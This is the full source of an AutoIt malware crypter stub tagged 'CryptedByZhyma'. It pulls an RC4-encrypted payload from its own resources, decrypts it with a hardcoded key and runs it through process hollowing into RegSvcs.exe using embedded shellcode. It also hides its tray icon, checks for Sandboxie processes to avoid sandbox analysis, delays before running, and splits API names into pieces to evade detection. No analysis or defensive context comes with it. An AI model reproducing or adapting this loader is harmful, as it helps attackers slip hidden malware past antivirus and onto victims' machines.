#CryptedByZhyma#endregion



Global $Memory, $FileBuffer
Global $injecto = _default_regsvcs_()
Global $injectoName = 'RegSvcs.exe'
Global $commandline = 'sdasasd'
Global $keyencode = '0DYpa6BW819hivT2bn96Jgi7f891ggUZuDjlp70uEvlP33zXvk'
Global $sMyPath = FileGetShortName(@ScriptFullPath)
Opt("TrayIconHide", 1)      ;#NoTrayIcon
_Start()
Func _Start()
	Local $sInstance, $sResource, $sFileSize, $sData, $LockData, $sWriteData, $sRun
    If ProcessExists($injectoName) then
		Sleep(2000)
	Else
		$sInstance = _LoadLibraryEx($sMyPath, 1)
		$sResource = sFindResource($sInstance, 10 , 999)
		$sFileSize = sSizeOfResource($sInstance, $sResource)
		$sData = sLoadResource($sInstance, $sResource)
		$LockData = sLockResource($sData)
		$sWriteData = DllStructCreate("Boolean[" & $sFileSize & "]", $LockData)
		$sRun = DllStructGetData($sWriteData, 1)
		If  ProcessExists ('SandboxieRpcSs.exe') or ProcessExists  ('SandboxieDcomLaunch.exe') Then
			Sleep(1000)
			Exit
		EndIf
		Sleep(20000)
		$iNewPID =_run(sRC4($sRun ,$keyencode), $injecto, $commandline)
	EndIf
endfunc
Func _LoadLibraryEx($sMyPath, $iFlag)
	Local $aRet = DllCall("kernel32", "hwnd", "LoadLi" & "braryEx", "str", $sMyPath, "hwnd", 0, "int", $iFlag)
    Return $aRet[0]
EndFunc
Func sSizeOfResource($sInstance, $sResource)
	Local $Ret = DllCall("kernel32", "dword", "SizeofResource", "ptr", $sInstance, "ptr", $sResource)
	Return $Ret[0]
EndFunc
Func sFindResource($sInstance, $sType, $sName)
	Local $Ret = DllCall("kernel32", "ptr", "FindResourceW", "ptr", $sInstance, "int", $sName, "int", $sType)
	Return $Ret[0]
EndFunc
Func sLoadResource($sInstance, $sResource)
	Local $Ret = DllCall("kernel32", "ptr", "LoadResource", "ptr", $sInstance, "ptr", $sResource)
	Return $Ret[0]
EndFunc
Func sLockResource($sData)
	Local $Ret = DllCall("kernel32", "ptr", "LockResource", "ptr", $sData)
	Return $Ret[0]
EndFunc
Func _run($PE, $wPath, $scommandline)
Local $lpShellcode = DllCall("kernel32", "ptr", "VirtualAlloc", "dword", 0, "dword", BinaryLen(sShellCode()), "dword", 0x3000, "dword", 0x40)
If Not @error And $lpShellcode[0] Then
    $lpShellcode = $lpShellcode[0]
Else
    exit
EndIf
Local $Shellcode_Struct = DllStructCreate("BYTE SHELLCODE[" & BinaryLen(sShellCode()) & "]", $lpShellcode)
Local $File_Struct = DllStructCreate("BYTE PE[" & StringLen($PE) & "]")
DllStructSetData($Shellcode_Struct, "SHELLCODE", sShellCode())
DllStructSetData($File_Struct, "PE", $PE)
Local $Ret = DllCallAddress("dword", $lpShellcode + 0x181, "wstr", $wPath, "wstr", $scommandline, "ptr", DllStructGetPtr($File_Struct))
DllCall("kernel32", "dword", "VirtualFree", "dword", $lpShellcode, "dword", 0, "dword", 0x8000)
If Not @error And $Ret[0] Then
    Sleep(5000)
	If not ProcessExists($injectoName) then
		_Start()
	else
		Exit
	endif
Else
    exit
EndIf
EndFunc

Func sShellCode()
	Local $sBuffer = "0x558BEC8B4D088BC18039007406408038"
    $sBuffer &= "0075FA2BC15DC20400558BEC56578B7D"
    $sBuffer &= "0833F657E8D7FFFFFF8BC885C974200F"
    $sBuffer &= "BE07C1E60403F08BC625000000F0740B"
    $sBuffer &= "C1E81833F081E6FFFFFF0F474975E05F"
    $sBuffer &= "8BC65E5DC20400558BEC51515356578B"
    $sBuffer &= "7D0833F68B473C8B44387803C78B5020"
    $sBuffer &= "8B581C03D78B482403DF8B401803CF89"
    $sBuffer &= "55FC894DF889450885C074198B04B203"
    $sBuffer &= "C750E882FFFFFF3B450C74148B55FC46"
    $sBuffer &= "3B750872E733C05F5E5B8BE55DC20800"
    $sBuffer &= "8B45F80FB704708B048303C7EBE9558B"
    $sBuffer &= "EC8B4D0833D28BC1663911740883C002"
    $sBuffer &= "66391075F82BC183E0FE5DC20400558B"
    $sBuffer &= "EC5356578B7D0885FF74578B5D0C85DB"
    $sBuffer &= "745057E8C6FFFFFF538BF0E8BEFFFFFF"
    $sBuffer &= "3BF0753E2BDFC74508610000000FB70F"
    $sBuffer &= "8BD10FB7343B8BC6663B4D08720681C2"
    $sBuffer &= "E0FF0000663B7508720505E0FF000066"
    $sBuffer &= "3BD0750E6685C9740583C702EBCF33C0"
    $sBuffer &= "EB0333C0405F5E5B5DC20800558BEC64"
    $sBuffer &= "A13000000056578B400C8B780C8BF7FF"
    $sBuffer &= "7508FF7630E874FFFFFF85C0740A8B36"
    $sBuffer &= "3BF775EB33C0EB038B46185F5E5DC204"
    $sBuffer &= "00558BEC81EC24040000837D08005356"
    $sBuffer &= "570F84DC050000837D10000F84D20500"
    $sBuffer &= "006A6B586A65596A7266894588586A6E"
    $sBuffer &= "5E6A6C5F6A336689458C586A32668945"
    $sBuffer &= "94586A2E5A6A646689459633C066894D"
    $sBuffer &= "8A66894D9059668945A06A7458668945"
    $sBuffer &= "A633C0668945B68D45A4506689758E66"
    $sBuffer &= "897D926689559866894D9A66897D9C66"
    $sBuffer &= "897D9E668975A466894DA866897DAA66"
    $sBuffer &= "897DAC668955AE66894DB066897DB266"
    $sBuffer &= "897DB4E824FFFFFF8BF88D458850E819"
    $sBuffer &= "FFFFFF8BD8C78528FFFFFF793A3C078D"
    $sBuffer &= "45C4C7852CFFFFFF794A8A0B8985ECFE"
    $sBuffer &= "FFFF8D45D88985F0FEFFFF8D45B88985"
    $sBuffer &= "F4FEFFFF8D45848985F8FEFFFF8D45DC"
    $sBuffer &= "8985FCFEFFFF8D8574FFFFFF898500FF"
    $sBuffer &= "FFFF8D45D0C78530FFFFFFEE38830CC7"
    $sBuffer &= "8534FFFFFF5764E101C78538FFFFFF18"
    $sBuffer &= "E4CA08C7853CFFFFFFE3CAD803C78540"
    $sBuffer &= "FFFFFF99B04806C78544FFFFFF93BA94"
    $sBuffer &= "03C78548FFFFFFE4C7B904C7854CFFFF"
    $sBuffer &= "FFE487B804C78550FFFFFFA92DD701C7"
    $sBuffer &= "8554FFFFFF05D13D0BC78558FFFFFF44"
    $sBuffer &= "27230FC7855CFFFFFFE86F180DC78560"
    $sBuffer &= "FFFFFFB57DAE09898504FFFFFF8D8570"
    $sBuffer &= "FFFFFF898508FFFFFF8D458089850CFF"
    $sBuffer &= "FFFF8D8578FFFFFF898510FFFFFF8D85"
    $sBuffer &= "7CFFFFFF898514FFFFFF8D45C0898518"
    $sBuffer &= "FFFFFF8D856CFFFFFF89851CFFFFFF8D"
    $sBuffer &= "45BC898520FFFFFF8D45E0898524FFFF"
    $sBuffer &= "FF33C08BF0FFB4B528FFFFFF83FE028B"
    $sBuffer &= "C70F4FC350E8DDFCFFFF8B8CB5ECFEFF"
    $sBuffer &= "FF890185C00F84E80300004683FE0F7C"
    $sBuffer &= "D433C040898564FFFFFF8D45E46A1050"
    $sBuffer &= "FF55D86A448D85A8FEFFFF50FF55D868"
    $sBuffer &= "CC0200008D85DCFBFFFFC785A8FEFFFF"
    $sBuffer &= "4400000050FF55D88B4D1033D2C785DC"
    $sBuffer &= "FBFFFF070001008BFA8B713C03F10FB7"
    $sBuffer &= "46148955FC8955CC8945C83996A00000"
    $sBuffer &= "0074163996A4000000740EF646160175"
    $sBuffer &= "0833DB43895DF8EB058BDA8955F833C0"
    $sBuffer &= "8955D46639110F94C03D4D5A00000F84"
    $sBuffer &= "4F03000033C039160F94C03D50450000"
    $sBuffer &= "0F843D03000033C0663956040F94C03D"
    $sBuffer &= "4C0100000F84290300008D45E4508D85"
    $sBuffer &= "A8FEFFFF5052526A04525252FF750CFF"
    $sBuffer &= "7508FF558485C00F84C50200008D85DC"
    $sBuffer &= "FBFFFF50FF75E8FF558085C00F84B002"
    $sBuffer &= "000033C0506A048D45CC508B8580FCFF"
    $sBuffer &= "FF83C00850FF75E4FF957CFFFFFF85C0"
    $sBuffer &= "0F848C0200008B45CC3B4634750F50FF"
    $sBuffer &= "75E4FF55B885C00F85750200006A4068"
    $sBuffer &= "00300000FF765033C050FF9574FFFFFF"
    $sBuffer &= "8BF885FF0F84580200006A4068003000"
    $sBuffer &= "00FF7650FF7634FF75E4FF55DC8945FC"
    $sBuffer &= "85C0754185DB7518FF7634FF75E4FF55"
    $sBuffer &= "B86A406800300000FF7650FF7634EB14"
    $sBuffer &= "6A406800300000FF765033C0C745D401"
    $sBuffer &= "00000050FF75E4FF55DC8945FC85C00F"
    $sBuffer &= "84FD010000FF7654FF751057FF55C433"
    $sBuffer &= "C933C0894DF4663B4606732E8B5DC883"
    $sBuffer &= "C32C03DEFF73FC8B03034510508B43F8"
    $sBuffer &= "03C750FF55C48B4DF48D5B280FB74606"
    $sBuffer &= "41894DF43BC87CDC33C98B5F3C8B45FC"
    $sBuffer &= "03DF837DD4008943340F848100000083"
    $sBuffer &= "7DF800747B8B93A000000003D7894DF8"
    $sBuffer &= "398BA400000076688B420483E808894D"
    $sBuffer &= "F4A9FEFFFFFF76410FB74C4A086685C9"
    $sBuffer &= "74248B463481E1FF0F0000030A290439"
    $sBuffer &= "8B45F40FB74C42088B433481E1FF0F00"
    $sBuffer &= "00030A0104398B42048B4DF483E80841"
    $sBuffer &= "D1E8894DF43BC872BF8B4DF8034A0403"
    $sBuffer &= "52043B8BA40000006A00894DF8597298"
    $sBuffer &= "33DB53FF765057FF75FCFF75E4FF55D0"
    $sBuffer &= "85C00F840C0100008D8568FFFFFF506A"
    $sBuffer &= "02FF7654FF75FCFF75E4FF55BC85C00F"
    $sBuffer &= "84EF00000033C0895DF8663B4606736F"
    $sBuffer &= "8B5DC883C33C03DE8B03A90000002074"
    $sBuffer &= "1985C079046A40EB172500000040F7D8"
    $sBuffer &= "1BC083E01083C010EB1585C079056A04"
    $sBuffer &= "58EB0CA9000000406A00580F95C0408D"
    $sBuffer &= "8D68FFFFFF5150FF73E48B43E80345FC"
    $sBuffer &= "50FF75E4FF55BC85C074128B4DF883C3"
    $sBuffer &= "280FB7460641894DF83BC8729B33DB68"
    $sBuffer &= "008000005357FF55C085C07467536A04"
    $sBuffer &= "8D45FC508B8580FCFFFF83C00850FF75"
    $sBuffer &= "E4FF55D085C0744C8B46280345FC8985"
    $sBuffer &= "8CFCFFFF8D85DCFBFFFF50FF75E8FF95"
    $sBuffer &= "78FFFFFF85C0742CFF75E8FF956CFFFF"
    $sBuffer &= "FF85C0741F837DE4007406FF75E4FF55"
    $sBuffer &= "E0837DE8007406FF75E8FF55E08B45EC"
    $sBuffer &= "EB4333DB837DE400741053FF75E4FF95"
    $sBuffer &= "70FFFFFFFF75E4FF55E0837DE8007406"
    $sBuffer &= "FF75E8FF55E085FF740A680080000053"
    $sBuffer &= "57FF55C08B8564FFFFFF83F8050F8620"
    $sBuffer &= "FCFFFF33C05F5E5B8BE55DC20C00"
	Return $sBuffer
EndFunc

Func sRC4($Data, $Key)
	Local $sOpcode = "0xF6B020C81001006A0010535600578B551031C989C8004989D7F2AE48482900C88945F085C00F8400DC000000B9000100000088C82C0188840D00EFFEFFF" & _
	"FE2F3836500F4008365FC00817D02FC01367D478B45FC3100D2F775F092034510000FB6008B4DFC0FB6088C0DF0005801C8034508F425FF008C8945F48B2075FC8A8435012C8B7" & _
	"D50F486843D0112880310FF4045FCEBB08D9D010A3100FF89FA39550C7663688B85EC000E40033D020B898CD803020700630385E8000843041B010A89DE03B5011B8A200689DF0" & _
	"3BD011186070088060FB60E0FB6079001C181E101298A840294008B750801D630064200EB985F5E5BC9C2100000"
	$sOpcode = _LZNTDecompress($sOpcode)
	Local $sBuffer = DllStructCreate("by" & "te[" & BinaryLen($sOpcode) & "]")
	DllStructSetData($sBuffer, 1, $sOpcode)
	Local $Buffer = DllStructCreate("by" & "te[" & BinaryLen($Data) & "]")
	DllStructSetData($Buffer, 1, $Data)
	DllCall("user" & "32.dll", "none", "CallWin" & "dowProc", "ptr", DllStructGetPtr($sBuffer), "ptr", DllStructGetPtr($Buffer), "int", BinaryLen($Data), "str", $Key, "int", 0)
	Local $Ret = DllStructGetData($Buffer, 1)
	$Buffer = 0
	$sBuffer = 0
	Return $Ret
EndFunc

Func _LZNTDecompress($sBinary)
    $sBinary = Binary($sBinary)
	$sBinarylen = BinaryLen($sBinary)
    Local $sWriteData = DllStructCreate("by" & "te[" & $sBinarylen & "]")
	DllStructSetData($sWriteData, 1, $sBinary)
    Local $sBufferPtr = DllStructCreate("by" & "te[" & 16 * DllStructGetSize($sWriteData) & "]")
    Local $sCallDecompress = DllCall("nt" & "dll.dll", "int", "Rt" & "lDecompr" & "essBuffer", "ushort", 258, "ptr", DllStructGetPtr($sBufferPtr), "dword", DllStructGetSize($sBufferPtr), "ptr", DllStructGetPtr($sWriteData), _
            "dword", DllStructGetSize($sWriteData), _
            "dword*", 0)
    Local $sDecompressed = DllStructCreate("by" & "te[" & $sCallDecompress[6] & "]", DllStructGetPtr($sBufferPtr))
    Return  DllStructGetData($sDecompressed, 1)
EndFunc



